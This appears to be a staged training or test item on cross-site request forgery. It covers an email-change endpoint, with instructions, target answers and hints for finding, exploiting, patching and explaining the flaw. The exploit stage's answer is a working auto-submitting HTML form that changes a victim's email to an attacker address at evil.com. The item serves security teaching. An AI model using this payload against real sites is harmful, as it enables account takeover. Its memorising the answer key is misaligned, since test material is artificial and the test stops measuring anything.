title: Cross-Site Request Forgery
description: An endpoint that allows a user to change their email without any CSRF protection.

stages.name: Find the vulnerability
stages.instruction: Identify why this POST request is vulnerable to CSRF.
stages.target: The endpoint does not require a secret, unpredictable token to validate the request, allowing an attacker to forge it from another site.

stages.name: Exploit it
stages.instruction: Provide the HTML code for a form on an attacker's site that would automatically submit a request to update the user's email.
stages.target: <form action='http://victim.com/update_email' method='POST' id='csrf-form'> <input type='hidden' name='email' value='attacker@evil.com'> </form> <script>document.getElementById('csrf-form').submit();</script>

stages.name: Patch it
stages.instruction: What is the standard defense against CSRF in web frameworks?

stages.name: Explain it
stages.instruction: How do anti-CSRF tokens prevent this attack?
stages.target: The server generates a unique token for the session and requires it to be sent with every state-changing request. An attacker's site cannot access this token due to the Same-Origin Policy.

hints: Think about how browsers automatically send cookies.
An attacker can make your browser send a request to a different domain.
